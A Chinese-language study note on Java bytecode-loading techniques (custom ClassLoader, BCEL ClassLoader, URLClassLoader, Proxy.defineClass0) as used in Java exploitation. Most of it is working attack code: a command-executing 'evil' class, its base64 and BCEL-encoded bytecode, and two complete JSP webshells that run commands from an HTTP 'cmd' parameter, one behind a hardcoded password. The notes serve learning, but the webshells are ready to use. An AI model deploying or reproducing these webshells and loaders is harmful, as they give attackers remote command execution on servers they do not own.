# ClassLoader

学习`ClassLoader`加载的部分代码
# java加载字节码的相关笔记

## 0x00 前言

在java安全很多情况下都需要加载字节码来实现，这个实现离不开类加载器，也就是`ClassLoader`

在p神 《java安全漫谈13》中提到到动态加载字节码的方式，这里结合`4ra1n`师傅的文章做一个总结

## 0x01 自定义类加载器

这里是用于加载`JSP Webshell`的讨论

首先有一个加载的恶意类

```java
public class ByteCodeEvil {
    String res;
    public ByteCodeEvil(String cmd) throws IOException {
        // 简单回显 Webshell
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        // 回显
        return res;
    }
}
```

将其编译为`Class`文件之后，还需要对其进行`Base64`编码，因为直接获取到的字节码是`byte[]`，为了避免在传输过程中的一些问题，我们选择将其转为`base64`编码

可以进行如下操作

```java
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ByteCodeEvil.class.getName());
        byte[] code = clazz.toBytecode();
        String bytes = Base64.getEncoder().encodeToString(code);
        System.out.println(bytes);
```

> 其中ClassPool属于`javassist`中的东西，我们需要导入依赖
>
> ```pom.xml
> <dependency>
>          <groupId>org.javassist</groupId>
>          <artifactId>javassist</artifactId>
>          <version>3.24.0-GA</version>
>      </dependency>
> ```

最后可以获得`Base64`加密后的字节码

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311210525.png)

之后我们需要从自定义的类加载器中将类加载出来，然后进行命令的执行，同时`ClassLoader`无法在运行时直接加载字节码

我们开始定义类加载器，一共需要三步：

1. 编写继承ClassLoader的抽象类
2. 重写findClass()方法和defineClass()方法
3. 在findClass()方法中调用调用`defineClass()`方法

根据loadClass方法，首先会判断类是否已经被加载了(1)，如果没有，就会调用`loadClass`去加载(2)，如果还是没有找到，会调用`findBootstrapClassOrNull`方法。如果没有重写该方法的情况，默认是抛出异常。如果重写了该方法，则会自定义加载(3)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311234629.png)

开始重写方法

1. 重写`loadClass`方法的代码如下，当我们加载的是指定名称的类时，就调用重写后的`findClass`方法

   ```java
   @Override
   public Class<?> loadClass(String name) throws ClassNotFoundException {
       if (name.contains("ByteCodeEvil")) {
           return findClass(name);
       }
       return super.loadClass(name);
   }
   ```

2. 重写`findClass`

   > 在`findClass`中，如果调用`defineClass`加载指定的恶意字节码，就会达到运行时加载字节码的效果.

   ```java
   @Override
   protected Class<?> findClass(String name) throws ClassNotFoundException {
       try {
           byte[] bytes = Base64.getDecoder().decode("");
           return this.defineClass(name, bytes, 0, bytes.length);
       } catch (Exception e) {
           e.printStackTrace();
       }
       return super.findClass(name);
   }
   ```

3. 根据双亲委派机制完善`findClass`

   ![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311233314.png)



> 双亲委派机制
>
> 在java的类加载中，首先会检查该类是否已经被加载，若没有被加载，则会委托父加载器进行装载，只有当父加载器无法加载时，才会调用自身的`findClass()`方法进行加载。这样避免了子加载器加载一些试图冒名顶替可信任类的不可靠类，也不会让子加载器去实现父加载器实现的加载工作
>
> 例如用户使用自定义加载器加载`java.lang.Object`类，实际上委派给`BootstrapClassLoader`加载器。如果用户使用自定义类加载器加载`java.lang.Exp`类，父类无法加载只能交给自定义类加载器。由于同在`java.lang`包下，所以`Exp`类可以访问其他类的`protected`属性，可能涉及到一些敏感信息
>
> 因此必须将这个类与可信任类的访问域隔离，JVM中为了避免这样的危险操作，只允许由同一个类加载器加载的同一包内的类之间互相访问，这样一个由同一个类加载器加载的并属于同一个包的多个类集合称为运行时包
>
> 类加载体系为不同类加载器加载的类提供不同的命名空间，同一命名空间内的类可以互相访问，不同命名空间的类不知道彼此的存在

除了命名空间的访问隔离和双亲委派的受信类保护，类加载器体系还用保护域来定义代码在运行时可以获得的权限

> 每个class文件均和一个代码来源相关联，这个代码来源(`java.security.CodeSource`)通过URL类成员`location`指向代码库和对该class文件进行签名的零个或多个证书对象的数组。class文件在进行代码认证的过程中可能经过多个证书签名，也可能没有进行签名
>
> 访问控制策略`Policy`对权限的授予是以`CodeSource`为基础进行的，每个`CodeSource`拥有若干个`Permission`，这些`Permission`对象会被具体地以其子类描述，并且和`CodeSource`相关联的`Permission`对象将被封装在`java.security.PermissionCollection`类的一个子类实例中，以描述该`CodeSource`所获取的权限
>
> 类加载器的实现可以通过将代码来源(`CodeSource`)即代码库和该class文件的所有签名者信息，传递给当前的`Policy`对象的`getPermissions()`方法，来查询该代码来源所拥有的权限集合`PermissionCollection`(在策略初始化时生成)，并以此构造一个保护域传递给`defineClass()`以此指定类的保护域

在jdk自带的源码中`defineClass`

```java
    protected final Class<?> defineClass(String name, byte[] b, int off, int len,
                                         ProtectionDomain protectionDomain)
        throws ClassFormatError
    {
        protectionDomain = preDefineClass(name, protectionDomain);
 
    }
```

跟进`PreDefineClass`可以看到当pd为空的时候，会返回默认的`defaultDomain`

```java
private ProtectionDomain preDefineClass(String name,
                                            ProtectionDomain pd)
    {
        if (pd == null) {
            pd = defaultDomain;
        }
        return pd;
    }
```

再跟上默认的`defaultDomain`

```java
    private final ProtectionDomain defaultDomain =
        new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                             null, this, null);
```

同时，因为我们要往入写恶意类执行命令，所以我们需要最高权限

```java
PermissionCollection pc = new Permissions();
pc.add(new AllPermission());
```

根据官方文档：The AllPermission is a permission that implies all other permissions

意味着该代码拥有全部的权限，也就是最高权限，也拥有`拥有`SocketPermission`和`FilePermission`这种敏感操作的权限`

最后得到如下

```java
@Override
protected Class<?> findClass(String name) throws ClassNotFoundException {
    try {
        byte[] bytes = Base64.getDecoder().decode("");
        PermissionCollection pc = new Permissions();
        pc.add(new AllPermission());
        ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
        return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
    } catch (Exception e) {
        e.printStackTrace();
    }
    return super.findClass(name);
}
```

我们放到`Test.java`试一下

```java
package com.Evil;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.security.*;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        ClassLoader loader = new ClassLoader() {
            @Override
            public Class<?> loadClass(String name) throws ClassNotFoundException {
                if(name.contains("ByteCodeEvil")){
                    return findClass(name);
                }
                return super.loadClass(name);
            }

            @Override
            protected Class<?> findClass(String name) throws ClassNotFoundException {
                try {
                    byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=");
                    PermissionCollection pc = new Permissions();
                    pc.add(new AllPermission());
                    ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
                    return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return super.findClass(name);
            }
        };

        String cmd = "calc.exe";
        Class<?> clazz = loader.loadClass("com.Evil.ByteCodeEvil");
        Constructor<?> constructor = clazz.getConstructor(String.class);
        String result = constructor.newInstance(cmd).toString();
        System.out.println(result);
    }
}

```

放入我们一开始生成的恶意类的字节码文件，用反射进行执行，最后使用jsp，替换输出为内置对象。就形成了一个jsp马

```java
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.security.*" %>
<%@ page pageEncoding="GB2312" %>
<%
    ClassLoader loader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if(name.contains("ByteCodeEvil")){
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=");
                PermissionCollection pc = new Permissions();
                pc.add(new AllPermission());
                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    };

    String cmd = request.getParameter("cmd");
    Class<?> clazz = loader.loadClass("com.Evil.ByteCodeEvil");
    Constructor<?> constructor = clazz.getConstructor(String.class);
    String result = constructor.newInstance(cmd).toString();
    response.getWriter().print(result);
%>
```

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312002047.png)

## 0x02 BECL ClassLoader

> BCEL 的全名为 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。

根据P神的文章 https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html

在 Java 8u251以前，都是可以使用的

同理，我们也需要获取`BECL`的字节码

```java
package com;


import com.Evil.ByteCodeEvil;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;

public class GetBecl {
    public static void main(String[] args) throws IOException {
        JavaClass cls = Repository.lookupClass(ByteCodeEvil.class);
        String code = Utility.encode(cls.getBytes(),true);
        System.out.println(code);
    }
}
```

使用 BCEL 提供的两个类 `Repository` 和 `Utility`，先将`JAVAClass`转换成原生字节码，使用其他类获取字节码也可

```java
		ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ByteCodeEvil.class.getName());
        String code = Utility.encode(clazz.toBytecode(),true);
        System.out.println(code);
```

如图，将会获得`Becl`字节码

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312093020.png)

动态调试`loadClass`发现，会判断加载的字节码是否以`$$BCEL$$`开头

```java
protected Class loadClass(String class_name, boolean resolve)
    throws ClassNotFoundException
  {
    Class cl = null;

   		...

        if(class_name.indexOf("$$BCEL$$") >= 0)
          clazz = createClass(class_name);
        else { // Fourth try: Load classes via repository
          if ((clazz = repository.loadClass(class_name)) != null) {
            clazz = modifyClass(clazz);
          }
          else
            throw new ClassNotFoundException(class_name);
        }
		...

    classes.put(class_name, cl);

    return cl;
  }
```

则编写测试类，继续以0x01中的恶意类为基础，可以实现命令

```java
package com;

import java.lang.reflect.InvocationTargetException;

public class Becl {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        String cmd = "calc.exe";
        String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A";
        Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        ClassLoader loader = (ClassLoader) c.newInstance();
        Class<?> clazz = loader.loadClass(bcelCode);
        java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
        Object obj = constructor.newInstance(cmd);
        System.out.println(obj.toString());
    }
}
```

同理，也可以将输入输出替换为内置对象，做一个jsp马

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%! String PASSWORD = "123456"; %>
<%
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A
";
    Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader) c.newInstance();
    Class<?> clazz = loader.loadClass(bcelCode);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    // 回显
    response.getWriter().print("<pre>");
    response.getWriter().print(obj.toString());
    response.getWriter().print("</pre>");
%>
```




## 0x03 URLClassLoader

URLClassLoader可以加载任意路径下的类

有点类似于`RMI`和`LDAP`下的远程加载恶意类的方式

```java
package com.URL;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        URL url = new URL("http://127.0.0.1:8000/");
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class<?> clazz = loader.loadClass("ByteCodeEvil");
        Constructor<?> constructor = clazz.getConstructor(String.class);
        constructor.newInstance("calc.exe");

    }
}

```

将0x01中的恶意类的`java`文件，放置在文件夹中，(将包名除去)，重新编译为`class`文件，然后使用python开一个`HTTP`服务

同理，使用内置对象替换，也可以作为`jsp`马 (这里4ra1n师傅将恶意类打包成jar包了)

## 0x04 defineClass0

这里的`defineClass0`，是基于`Proxy`的**native**方法，使用到的`Proxy`类是Java动态代理的底层实现类。也许可以绕过一些防御。

在`java.lang.reflect.Proxy`中有这么一个方法，里面没有定义任何方法

```java
private static native Class<?> defineClass0(ClassLoader loader, String name, byte[] b, int off, int len);
```

```java
package com.proxy_define0;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class Define0_Test {
    public static Class<?> defineByProxy(String className, byte[] classBytes) throws Exception {
        // 获取系统的类加载器
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        // 反射java.lang.reflect.Proxy类获取其中的defineClass0方法
        Method method = Proxy.class.getDeclaredMethod("defineClass0",ClassLoader.class, String.class, byte[].class, int.class, int.class);
        // 修改方法的访问权限
        method.setAccessible(true);
        // 反射调用java.lang.reflect.Proxy.defineClass0()方法
        // 动态向JVM注册对象
        // 返回一个 Class 对象
        return (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
    }
    public static void main(String[] args) throws Exception {
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxjb20vQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcALgEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBBDABCAEMMAEQARQcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAEGNvbS9CeXRlQ29kZUV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQAAABIAEwAAAAIAAQAUABUAAgAWAAAA0gAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAADABcAAAAeAAcAAAAJAAQACwAMAAwAJQAOAC8ADwA+ABEARgASABgAAAA0AAUAAABHABkAGgAAAAAARwAbABMAAQAMADsAHAAdAAIAJQAiAB4AHwADACwAGwAgABMABAAhAAAAGwAC/wAlAAQHACIHACMHACQHACUAAPwAGAcAIwAmAAAABAABACcAAQAoACkAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAXABgAAAAMAAEAAAAFABkAGgAAAAEAKgAAAAIAKw==");
        Class<?> testClass = defineByProxy("com.ByteCodeEvil", bytes);
        Constructor<?> constructor = testClass.getConstructor(String.class);
        constructor.newInstance("calc.exe");
    }
}

```



## 0x05 TemplateImpl

这个类用的比较多一些，例如CC链、Fastjson、7U21

开发者不会直接使用到 defineClass 方法，但是，Java 底层还是有一些类用到了它，如：`TemplatesImpl`。

